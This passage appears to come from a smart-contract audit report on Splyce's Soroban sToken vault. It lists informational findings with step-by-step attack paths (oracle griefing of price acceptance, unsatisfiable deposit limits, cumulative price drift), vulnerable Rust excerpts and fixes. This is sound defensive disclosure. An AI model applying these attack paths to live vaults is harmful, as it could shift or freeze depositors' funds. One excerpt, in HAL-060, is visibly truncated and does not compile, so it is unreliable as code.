| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | oracle-external-dependency |
| **Location** | `contracts/stoken/src/stoken.rs:L967-L980`, `contracts/stoken/src/stoken.rs:L1438-L1442` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/45853ca3132914b70903e8bb9d676024685c410f |
| **Redacted** | false |

**Description.**

`SToken.update_price()` writes `write_last_price_update_timestamp` only in the low-deviation (auto-apply) branch, not in the high-deviation (pending) branch, so the oracle must wait `price_update_cooldown_secs` only for its first pending submission and can thereafter overwrite the `PendingPrice` record, resetting its embedded `timestamp`, after each subsequent cooldown window without a manager ever accepting or rejecting the pending price.

This creates two compounding issues: (a) the oracle bypasses the per-update cooldown for pending-path submissions, because `last_price_update_timestamp` is not advanced, the cooldown check at line 954 uses the timestamp from the last auto-accepted price, not the most recent pending submission; and (b) by overwriting `PendingPrice.timestamp` each time, the oracle perpetually resets the acceptance window that non-manager actors need to satisfy `cooldown_expired` in `accept_price`.

**Concrete attack steps:**

1. Oracle calls `update_price(inflated_price)` with deviation > `max_deviation_bps`. A `PendingPrice { value, timestamp: T0 }` is written at lines 986-992. `write_last_price_update_timestamp` is NOT called.
2. After `price_update_cooldown_secs` elapses, the cooldown check at line 954 is satisfied again (it still reads the old auto-apply timestamp). Oracle calls `update_price(inflated_price_v2)`, overwriting `PendingPrice { value: v2, timestamp: T1 }`.
3. Any non-manager actor attempting `accept_price` now computes `cooldown_expired = T_now >= T1 + price_acceptance_cooldown_secs`, the window has been reset to `T1`.
4. Oracle repeats every `price_update_cooldown_secs`, keeping non-manager actors permanently outside the acceptance window.

#### Code Location

`SToken.update_price()`**:** low-deviation branch writes timestamp; high-deviation branch does not

```rust
if deviation_bps <= max_deviation_bps { // Low-deviation (auto-apply) branch:
    write_price(&env, &new_price);
    write_last_price_update_timestamp(&env, &timestamp);
    write_pending_price(&env, None);
} else { // High-deviation (pending) branch:
    write_pending_price(
        &env,
        Some(PendingPrice {
            value: new_price,
            timestamp: timestamp, // resets acceptance window
        }),
    );
    // write_last_price_update_timestamp NOT called  ← missing
}
```

`SToken.accept_price()`**:** acceptance window computed from PendingPrice.timestamp

```rust
let pending_price_timestamp = read_pending_price(&env)
    .map(|p| p.timestamp)
    .ok_or(STokenCoreError::InvalidTimestamp)?;
let cooldown_expired =
    timestamp >= pending_price_timestamp + price_acceptance_cooldown_secs;
```

**Impact.**

A compromised oracle can prevent non-manager actors from ever independently accepting a pending price, concentrating price-acceptance power in the manager. Simultaneously, the oracle can submit new pending prices each cooldown window without constraint, using each overwrite to pivot to a more favorable value just before manager review, effectively allowing the oracle to condition the pending price the manager sees.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Call `write_last_price_update_timestamp(&env, &timestamp)` in the high-deviation (pending) branch of `update_price`, immediately after `write_pending_price`, so the per-update cooldown applies uniformly to all price submissions regardless of deviation.
- Additionally, prevent overwriting an existing `PendingPrice` unless it has been explicitly accepted or rejected by the manager, or its own acceptance window has fully elapsed, so the original proposal deadline is preserved and the timestamp-reset griefing vector is eliminated.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-060] Propose Limits Skips Min-Max Cross Validation

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 0.81 (AO:S/AC:L/AX:L/R:P/S:U/C:N/A:H/I:L/D:N/Y:N) (source: HAL-60) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | data-validation |
| **Location** | `contracts/stoken/src/stoken.rs:L180-L183`, `contracts/stoken/src/stoken.rs:L802-L808` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/04a0cdd3a458373838d5cec9906863343657e214 |
| **Redacted** | false |

**Description.**

`SToken.validate_new_limits()` enforces `min_shares_to_mint ≤ max_shares_per_user` only when both values are supplied as `Some` in the same call, and `propose_limits()` never substitutes the currently stored `max_shares_per_user` when only `min_shares_to_mint` is being changed, unlike the equivalent `max_shares_per_user ≤ max_total_shares` check, which `propose_limits` already computes using effective (`unwrap_or(read_*)`) values.

**Exploit path:**

1. Current on-chain state: `max_shares_per_user = 1000`, `min_shares_to_mint = 500`.
2. A manager calls `propose_limits(new_min_shares_to_mint = Some(9999), ..other params = None)`.
3. `validate_new_limits` receives `max_shares_per_user = None` and `min_shares_to_mint = Some(9999)`; the pair check `if let (Some(user_limit), Some(min_shares)) = (max_shares_per_user, min_shares_to_mint)` does not match, so the cross-field bound is skipped, and `9999` passes the standalone `MAX_ALLOWED_MIN_SHARES_TO_MINT` check.
4. After the cooldown, `accept_limits` writes `min_shares_to_mint = 9999` while `max_shares_per_user` remains `1000` in storage.
5. `deposit_core` now requires `user_shares ≤ 1000` (`check_max_shares_per_user`) and `final_shares ≥ 9999` (min-mint check) in the same call, a range with no valid value.

#### Code Location

`validate_new_limits()`**:** cross-field check only fires when both fields are supplied together

```rust
if let (Some(user_limit), Some(min_shares)) = (max_shares_per_user, min_shares_to_mint) {
        return Err(STokenCoreError::InvalidLimit);
    }
}
```

`propose_limits()`**:** effective-value pattern used for the total/per-user pair but not extended to min-mint

```rust
let effective_total_shares = new_max_total_shares.unwrap_or(read_max_total_shares(&env));
let effective_shares_per_user =
    new_max_shares_per_user.unwrap_or(read_max_shares_per_user(&env));

if effective_shares_per_user > effective_total_shares {
    return Err(STokenCoreError::InvalidLimit);
}
```

**Impact.**

- A manager proposing a single-field change to `min_shares_to_mint` can silently create a state where `min_shares_to_mint > max_shares_per_user`, making the two per-deposit bounds simultaneously unsatisfiable.
- Every subsequent `deposit_core` call reverts, bricking the vault's primary entry point until a further timelocked `propose_limits`/`accept_limits` cycle corrects the mismatch.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend computing effective values for both `min_shares_to_mint` and `max_shares_per_user` with `unwrap_or(read_*)` in `propose_limits`, and enforcing `effective_min_shares_to_mint ≤ effective_max_shares_per_user` against those effective values rather than relying on `validate_new_limits`'s same-call pair check alone.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-061] Cancel Withdrawal Blocked During Vault Pause

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 0.84 (AO:A/AC:L/AX:M/R:F/S:U/C:N/A:M/I:N/D:N/Y:N) (source: HAL-61) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | liveness-dos |
| **Location** | `contracts/stoken/src/stoken.rs:L1531-L1536` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/dc3dbee4ebca41a5bb27e3f9084571e04395ba3e |
| **Redacted** | false |

**Description.**

`SToken.cancel_withdrawal()` reverts with `VaultPaused` whenever the vault is paused, even though the function only moves share tokens already held in vault custody back to the caller (plus an optional penalty mint) and never transfers underlying assets.

**Exploit path:**

1. A user has a pending `WithdrawalRequest` with shares held in vault custody.
2. The manager or guardian calls `pause_vault`.
3. The user calls `cancel_withdrawal(caller, request_id)`.
4. The function's first check, `if read_paused(&env) { return Err(STokenWithdrawalRequestError::VaultPaused); }`, rejects the call before reaching any of the share-transfer logic below it.

#### Code Location

`SToken.cancel_withdrawal()`**:** paused check precedes any custody or share logic

```rust
caller.require_auth();

// Check that vault is not paused
if read_paused(&env) {
    return Err(STokenWithdrawalRequestError::VaultPaused);
}
```

**Impact.**

Users cannot reclaim shares from a pending withdrawal request for the entire duration of a pause, even though doing so involves no underlying token movement and poses no additional risk during the paused state. Combined with a pause window in which the manager retains other privileged withdrawal paths, users have no self-service way to exit their queued position until the vault is unpaused.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend allowing the user-initiated `cancel_withdrawal` path to proceed while the vault is paused, since it moves no underlying tokens, or explicitly documenting that pause is intended to freeze all withdrawal-queue exits, including harmless ones.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by removing the pause check from the shared entry point of `cancel_withdrawal` and re-adding it only inside the processor-initiated branch, so user self-cancels (pure share transfers, no minting) proceed during a pause while the supply-minting processor cancel path remains frozen.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-062] Auto-Apply Band Allows Unbounded Cumulative Oracle Price Drift

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 0.53 (AO:S/AC:M/AX:M/R:P/S:C/C:N/A:N/I:H/D:H/Y:N) (source: HAL-62) |
| **Difficulty / likelihood** | null |
| **Status** | Acknowledged |
| **Remediation verified by** | not-reviewed |
| **Category** | oracle-external-dependency |
| **Location** | `contracts/stoken/src/stoken.rs:L967-L972`, `contracts/stoken/src/stoken.rs:L306` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/576fbcf5550a524f7db3ec77bd860efcdf34909c |
| **Redacted** | false |

**Description.**

`SToken.update_price()` auto-applies any price whose single-step deviation is at or below `max_deviation_bps` with no tracking of cumulative drift from a manager-approved reference price. When a manager has raised `max_deviation_bps` to `MAX_ALLOWED_DEVIATION_BPS = 2000` (20%) through the governance flow (`propose_limits` → `accept_limits` with cooldown), a compromised oracle can compound 20% price moves each `price_update_cooldown_secs` window, halving or more than doubling the share price within approximately one hour, without any single step triggering a pending-price review.

This finding requires a non-default configuration: the default `max_deviation_bps` is 50 bps (0.5%, line 306), which limits single-step auto-apply drift to 0.5% and makes the compounding attack negligible. The risk materializes only when a manager has deliberately raised the band to several hundred or more bps. The `price_update_cooldown_secs` (default 300 s) also limits compounding speed.

**Concrete exploit path (non-default configuration:** `max_deviation_bps = 2000`**):**

1. Manager raises `max_deviation_bps` to 2000 via the governance timelock.
2. A compromised oracle calls `update_price(current_price * 1.20)` every `price_update_cooldown_secs` seconds. Each step passes the auto-apply branch at line 967 (`deviation_bps = 2000 <= max_deviation_bps = 2000`) with no manager involvement.
3. After approximately 13 consecutive +20% steps (~65 minutes at default 300 s cooldown), the share price has more than doubled. After ~10 consecutive -20% steps (~50 minutes), the price drops below 10% of the original.
4. No manager action is ever required for individual steps; every update is below the per-step threshold.

#### Code Location

`SToken.update_price()`**:** auto-apply branch with no cumulative drift check

```rust
if deviation_bps <= max_deviation_bps {
    write_price(&env, &new_price);
    write_last_price_update_timestamp(&env, &timestamp);
    write_pending_price(&env, None);                  // line 973
    return Ok(());                                    // no cumulative guard
}
```

`SToken.initialize()`**:** default `max_deviation_bps` is 50 bps

```rust
write_max_deviation_bps(&env, &config.max_deviation_bps.unwrap_or(50));
```

**Impact.**

On vaults configured with a wide auto-apply band, a compromised oracle can inflate share price to enable profitable deposits (buying cheap underlying) or deflate it to enable discounted withdrawals, shifting value from existing depositors to the attacker, with no single auto-applied step exceeding the configured threshold and no manager intervention required.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Introduce a `reference_price` storage key that is written only when the manager explicitly accepts a price via `accept_price`.
- Track cumulative drift as `|current_price - reference_price| / reference_price` and require manager acceptance once that cumulative move exceeds a configurable `max_cumulative_deviation_bps` threshold, regardless of individual step size.

**Remediation notes.**

**ACKNOWLEDGED**: The **Splyce team** made a business decision to acknowledge this finding and not alter the contracts, stating that:

> Cumulative sub-threshold drift accepted: each update is individually within band and oracle-rate-limited. Documented NOTE; rolling-window cap left as optional future hardening.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-063] ProxyAssetManager.propose_processor Accepts Identical Processor Causing No-Op Role Cycle

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 0.50 (AO:S/AC:L/AX:L/R:N/S:U/C:N/A:N/I:L/D:N/Y:N) (source: HAL-63) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | data-validation |
| **Location** | `contracts/proxy_asset_manager/src/proxy_asset_manager.rs:L523-L539`, `contracts/proxy_asset_manager/src/proxy_asset_manager.rs:L428-L435` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/42e9fd0247e782aa751d3c0666b6b61009a2445d |
| **Redacted** | false |

**Description.**

`ProxyAssetManager.propose_processor()` performs no check that `new_processor` differs from the current processor, unlike the sibling `propose_manager()` function which explicitly rejects a same-address proposal. When `accept_processor` is subsequently called with an identical address, the role is revoked from and re-granted to the same address (a no-op in access control state), and a `ProcessorUpdated` event is emitted where `old_processor == new_processor`.

#### Code Location

`ProxyAssetManager.propose_processor()`**:** no identity guard

```rust
#[only_role(caller, "manager")]
pub fn propose_processor(
    env: Env,
    new_processor: Address,
    caller: Address,
) -> Result<(), ProxyAssetManagerError> {
    // No check that new_processor != current processor
    extend_contract_ttl(&env, BUMP_THRESHOLD, EXTEND_TO_DAYS);
    let timestamp = env.ledger().timestamp();
    let cooldown = read_processor_change_cooldown(&env);

    write_pending_processor( // accepts an identical address with no guard
        &env,
        Some(PendingProcessor { new_processor: new_processor.clone(), timestamp }),
    );
    Ok(())
}
```

`ProxyAssetManager.propose_manager()`**:** identity guard present (contrast)

```rust
#[only_role(caller, "manager")]
pub fn propose_manager(env: Env, new_manager: Address, caller: Address) -> Result<(), ProxyAssetManagerError> {
    extend_contract_ttl(&env, BUMP_THRESHOLD, EXTEND_TO_DAYS);
    if caller == new_manager { // line 436
        return Err(ProxyAssetManagerError::InvalidManager);
    }
    // ...
}
```

**Impact.**

A same-address `propose_processor` + `accept_processor` sequence emits a `ProcessorUpdated` event with `old_processor == new_processor`, confusing off-chain monitoring systems and potentially masking legitimate processor changes in event streams. The access control state is unchanged; no funds are at risk.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Add a guard in `propose_processor` that rejects `new_processor` equal to the current processor, mirroring the pattern in `propose_manager`: retrieve the current processor via `get_first_role_member` and return `Err(ProxyAssetManagerError::SameProcessor)` if the addresses match.
- As a separate sub-recommendation, assert that at most one processor role member is present at any time (consistent with the single-processor model assumed by `get_first_role_member`) by checking `get_role_member_count` before granting the new role in `accept_processor`.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-064] Asset.mint Accepts Non-Positive Amounts Without Validation

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 0.46 (AO:S/AC:L/AX:H/R:N/S:C/C:N/A:N/I:M/D:L/Y:N) (source: HAL-64) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | data-validation |
| **Location** | `contracts/stoken/src/storage.rs:L410-L412`, `contracts/asset/src/asset.rs:L42-L45` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/5f651f2596c3ea6f7a26d422699babb13156e7c6 |
| **Redacted** | false |

**Description.**

`Asset.mint()` accepts `amount: i128` and passes it directly to `Base::mint` with no contract-level guard against zero or negative values, relying entirely on the `stellar_tokens` library's internal behavior, which is out of scope and may change across library versions. Any account granted the `minter` role (administered by `authority`) can call `mint` with `amount = 0` or `amount < 0`.

- **Zero-amount mint**: `Base::mint` may emit a zero-amount mint event, misleading off-chain indexers into recording a mint that transferred no value.
- **Negative-amount mint**: `Base::mint` delegates to `Base::update`, which panics with `FungibleTokenError::LessThanZero` when `amount < 0` (`stellar-tokens` 0.5.0, `storage.rs:410-412`), producing an opaque host panic instead of a structured contract error. The correct defensive check is `amount <= 0` (not `amount < 0`) because zero is also invalid per SEP-41.

Contrast with `SToken`, which always validates before calling `Base::mint`: `if fee_shares > 0 { Base::mint(env, &accountant, fee_shares as i128); }`. The `Asset` contract lacks this guard.

#### Code Location

`Asset.mint()`**:** missing amount validation

```rust
#[only_role(caller, "minter")]
pub fn mint(e: &Env, account: Address, amount: i128, caller: Address) {
    Base::mint(e, &account, amount); // no validation that amount is positive
}
```

**Impact.**

- A minter passing `amount = 0` emits a spurious mint event, corrupting off-chain balance indexers and audit logs in whichever environment this contract is deployed to.
- A minter passing `amount < 0` triggers an opaque library panic (`FungibleTokenError::LessThanZero`) that provides no meaningful contract-level error code to the caller, making failure diagnosis impossible.
- Today, `Asset` is deployed only as a labeled test asset and is not wired into any production vault as a real underlying token, so no user funds are currently at risk through this path. The gap should still be closed, since the contract's deployment role could change without every future integrator re-auditing this assumption.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Add explicit non-positive amount validation as the first operation in `Asset.mint`, before calling `Base::mint`.
- Define an `AssetError` enum with an `InvalidMintAmount` variant and return a `Result<(), AssetError>` so callers receive a structured error code rather than a host panic.
- This check must be `<= 0` (not `< 0`) because zero-amount mints are also invalid per SEP-41 and produce misleading events.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-065] Whitelist and AllowlistMint Reads Missing TTL Bump Risk Entry Archival and Restoration Overhead

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 0.42 (AO:A/AC:L/AX:M/R:F/S:U/C:N/A:L/I:N/D:N/Y:N) (source: HAL-65) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | state-archival-ttl |
| **Location** | `contracts/stoken/src/stoken.rs:L543-L545`, `contracts/stoken/src/stoken.rs:L518-L522`, `contracts/stoken/src/stoken.rs:L529-L533`, `contracts/stoken/src/stoken.rs:L568-L572` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/d9683230260c9d9d90ab94ed2c22cd52bc85eae9 |
| **Redacted** | false |

**Description.**

`SToken`'s `read_is_deposit_whitelisted()` and `read_is_withdrawal_whitelisted()` read from persistent storage without extending the TTL of the accessed entry. `read_allowlist_mint()` (used in the swap path) has the same flaw. Persistent storage entries are subject to a maximum 30-day TTL `EXTEND_TO_DAYS = MAXIMUM_EXTEND_DAYS * DAY_IN_LEDGERS`), and the TTL is currently extended only on write `add_to_deposit_whitelist`, `add_to_withdrawal_whitelist`, `accept_allowlist_mint`), never on read.

Contrast with `read_withdraw_request` (lines 540–547), which correctly extends TTL on every read:

```rust
if result.is_some() {
    extend_persistence_ttl(e, key, BUMP_THRESHOLD, EXTEND_TO_DAYS);
}
```

#### Code Location

`read_is_deposit_whitelisted()`**:** missing TTL bump on read

```rust
pub fn read_is_deposit_whitelisted(e: &Env, user: &Address) -> bool {
    let key = StorageKey::IsDepositWhitelisted(user.clone());
    e.storage().persistent().get::<_, bool>(&key).unwrap_or(false)
    // no extend_persistence_ttl call, entry expires after 30 days of no writes
}
```

`read_is_withdrawal_whitelisted()`**:** same pattern

```rust
pub fn read_is_withdrawal_whitelisted(e: &Env, user: &Address) -> bool {
    let key = StorageKey::IsWithdrawalWhitelisted(user.clone());
    e.storage().persistent().get::<_, bool>(&key).unwrap_or(false)
    // no extend_persistence_ttl call
}
```

`read_allowlist_mint()`**:** same pattern, affects swap path

```rust
pub fn read_allowlist_mint(e: &Env, mint: &Address) -> bool {
    let key = StorageKey::AllowlistMint(mint.clone());
    e.storage().persistent().get(&key).unwrap_or(false)
    // no extend_persistence_ttl call, archived entry silently disables cross-vault swaps
}
```

**Impact.**

- On vaults with `deposit_whitelist_enabled = true` or `withdrawal_whitelist_enabled = true`: after 30 days of no whitelist writes for a given user, that entry can be archived. The next deposit/withdrawal-request transaction touching it either pays an added restoration fee (transparent success) or fails once and must be resubmitted with restoration: an availability/gas-cost nuisance, not a lockout requiring manager intervention.
- On vaults using cross-vault swaps: `AllowlistMint` entries are subject to the same dynamic. A long-dormant vault pair can incur the same restoration fee or one-time transient failure on the next `swap_tokens` call between them.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend adding TTL extension inside all three read functions, matching the pattern used by `read_withdraw_request`. This keeps the entry alive on every user interaction (not just explicit whitelist/allowlist writes), minimizing the chance any of these keys ever cross into archival and avoiding the associated restoration fees/resubmissions.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-066] Unpause Leaves Stale Emergency Withdrawal Request in Storage

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 0.42 (AO:A/AC:L/AX:M/R:F/S:U/C:N/A:N/I:L/D:N/Y:N) (source: HAL-66) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | governance-centralization |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/83dd285d9e267efc32dca7142146f12a8c052a82 |
| **Redacted** | false |

**Description.**

`SToken.unpause_vault()` resets `emergency_withdraw_timelock_end` to zero (line 1807) but does not clear `EmergencyWithdrawTokenMint` or `EmergencyWithdrawalAmount`, leaving stale non-zero values in storage after an unpause that can no longer be executed.

The inconsistency is not exploitable on-chain: the next `emergency_withdraw` call 1 (with `timelock_end == 0`) simply overwrites the stale fields at lines 1850-1851 before proceeding, and the second `emergency_withdraw` call (completing the withdrawal) clears all three fields at lines 1896-1898. The stale state exists only during the pause-unpause-repause window, and is observable exclusively via direct on-chain storage reads or off-chain indexers, not through any callable vault function.

Off-chain monitors that read `EmergencyWithdrawTokenMint` and `EmergencyWithdrawalAmount` directly from contract storage will observe a non-empty emergency withdrawal request that can never be executed, potentially triggering false alerts or incorrect compliance reporting until the vault is paused again and the fields are overwritten.

#### Code Location

`SToken.unpause_vault()`: clears timelock but not the request fields

```rust
// contracts/stoken/src/stoken.rs
write_paused(&env, &false);                           // line 1805
write_emergency_withdraw_timelock_end(&env, &0);      // line 1807
// Missing:
// write_emergency_withdraw_token_mint(&env, None);
// write_emergency_withdrawal_amount(&env, &0);
```

`SToken.emergency_withdraw()`: all three fields cleared only on successful second call

```rust
// contracts/stoken/src/stoken.rs
// Call 1 stores the request:
write_emergency_withdraw_token_mint(&env, Some(token_mint.clone()));  // line 1850
write_emergency_withdrawal_amount(&env, &amount);
// Call 2 (after cooldown) clears all three:
write_emergency_withdraw_token_mint(&env, None);                       // line 1896
write_emergency_withdrawal_amount(&env, &0);
write_emergency_withdraw_timelock_end(&env, &0);
```

**Impact.**

Off-chain monitoring systems that read `EmergencyWithdrawTokenMint` and `EmergencyWithdrawalAmount` from contract storage will see a phantom emergency withdrawal request that is neither executable nor clearable without a subsequent pause-and-overwrite cycle, causing false alerts and state inconsistency in monitoring and compliance tooling.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- In `SToken.unpause_vault()`, clear all three emergency-withdrawal storage keys atomically alongside the timelock reset.
- Add an inline comment documenting the three-field invariant so future maintainers keep all three keys in sync whenever any one of them is modified.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by clearing `EmergencyWithdrawTokenMint` and `EmergencyWithdrawalAmount` alongside the timelock reset in `unpause_vault()`, with an invariant comment and a regression test verifying all three fields are cleared together.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-067] Dead Comparison on u64 Obscures Zero-Elapsed-Time Guard

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 0.17 (AO:S/AC:L/AX:H/R:N/S:U/C:N/A:N/I:L/D:N/Y:N) (source: HAL-67) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | state-archival-ttl |
| **Location** | `contracts/fixed_yield_oracle/src/fixed_yield_oracle.rs:L366-L370` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/a13f46aa277bab5d85581f1b853080089ee5e404 |
| **Redacted** | false |

**Description.**

`FixedYieldOracle.calculate_current_price()` compares `elapsed_seconds <= 0` where `elapsed_seconds` is a `u64` value, making the `< 0` branch permanently unreachable dead code. The condition is semantically identical to `elapsed_seconds == 0` but misleads maintainers into believing negative elapsed time is guarded against.

The current behavior is functionally correct: when `elapsed_seconds == 0` the function returns `initial_price`, which is the intended result. Rust does not error on this comparison, it compiles silently and requires Clippy to detect. The dead-code issue is purely a code-quality and maintainability concern with no direct fund-loss impact in the current implementation.

The latent risk is a future refactoring: if `elapsed_seconds` is changed to `i64` or `i128` for a valid reason (e.g. to support negative elapsed time for testing or timestamp correction) and the guard condition is not updated, a provider submitting `current_timestamp < created_at`, which is already rejected by the earlier check at line 357, could, if that outer guard is also removed, cause the function to return `initial_price` for negative inputs, masking the underflow. These are independent issues and the current `i64` risk is speculative; the confirmed finding is the dead comparison at line 368.

#### Code Location

`FixedYieldOracle.calculate_current_price()`**:** dead `< 0` branch on u64

```rust
let elapsed_seconds = current_timestamp - created_at;  // u64 subtraction
// For very small time periods, return initial price
if elapsed_seconds <= 0 {   // u64 is never < 0; equivalent to `== 0`
    return Ok(initial_price);
}
```

**Impact.**

No funds are at risk from the current implementation. The dead comparison creates misleading code that may cause future maintainers to incorrectly believe negative elapsed time is handled, increasing the risk of a silent regression if the type is later changed to a signed integer type.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Replace the dead comparison with an explicit equality check that matches the actual intent.
- Add a comment on the `elapsed_seconds` binding noting that it is `u64` and cannot be negative, documenting the invariant for future maintainers.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by replacing `elapsed_seconds <= 0` with `elapsed_seconds == 0` and documenting the u64 invariant.

Halborn remediation date: 2026-07-22.

---

## 4. Unified severity definitions

| Level | Definition |
|---|---|
| **Critical** | Directly exploitable now with no privileged preconditions: loss or freezing of user funds, full compromise of protocol control, or violation of a core safety property the protocol's security depends on. |
| **High** | Loss/freezing of funds, compromise of protocol control, or breach of a core guarantee requiring specific but realistic preconditions (a privileged role acting maliciously, a dependent contract compromised, timing conditions). Includes severe centralization of upgrade/admin keys where a single compromise endangers user funds. |
| **Moderate** | Violates intended behavior or degrades security guarantees: limited direct loss, loss requiring unlikely precondition chains, liveness failures with recovery paths, economic/oracle manipulation with bounded impact, or governance weaknesses with mitigating controls. |
| **Low** | Minor deviation from best practice with a plausible but low-impact security consequence. |
| **Informational** | No direct security impact: code quality, gas/efficiency, documentation, observability, test-coverage gaps. Use the Category field to distinguish these classes. |

## 5. Assumptions and limitations

- Out of scope: Third party dependencies and economic attacks.

## 6. Methodology

Halborn used a combination of manual and automated security testing techniques to assess the security of the in-scope contracts, following a risk-based methodology that emphasized defense in depth. The assessment strategy included:

- Research into the protocol's architecture, roles, and execution flows across the SToken vault, Factory, Accountant, NavOracle, FixedYieldOracle, ProxyAssetManager, and Multisig contracts, to build a model of intended behavior before searching for deviations.
- Manual line-by-line review of deposit, withdrawal, swap, fee accrual, and governance timelock logic, with particular attention to price update and acceptance flows, cooldown enforcement, and cross-vault interactions.
- Review of access control and privilege boundaries, verifying role gating across admin, manager, guardian, oracle, processor, accountant, asset manager, and upgrader roles, and validating the multisig and threshold policy signature verification path against the intended trust model.
- Automated static analysis and linting passes over the Rust and Soroban codebase to surface unchecked arithmetic, unsafe casts, and other classes of implementation bugs.
- On-chain unit and integration testing in the Soroban test environment, including proof of concept exploits for critical and high severity findings, to confirm exploitability and validate proposed remediations.

Confidence in the assessment's coverage was achieved by cross-referencing manual findings against test replays and proof of concept results, and by prioritizing review effort toward flows that could result in loss or lockup of user principal, incorrect price or share accounting, or a breakdown of the governance timelock guarantees.

## 7. Disclaimer and license

Halborn strongly recommends conducting a follow-up assessment of the project either within six months or immediately following any material changes to the codebase, whichever comes first. This approach is crucial for maintaining the project’s integrity and addressing potential vulnerabilities introduced by code modifications.

This report reflects a point-in-time review of the specified scope at the specified commit(s). It is not a warranty that the code is free of vulnerabilities, not an endorsement of the project, and not investment advice. Security reviews are time-boxed and cannot guarantee the absence of defects. The firm's original PDF report is the authoritative document; this markdown file is a derived summary prepared for the Stellar Audit Bank report archive. Copyright in the report content remains with Halborn; reuse is governed by the license stated in the frontmatter.
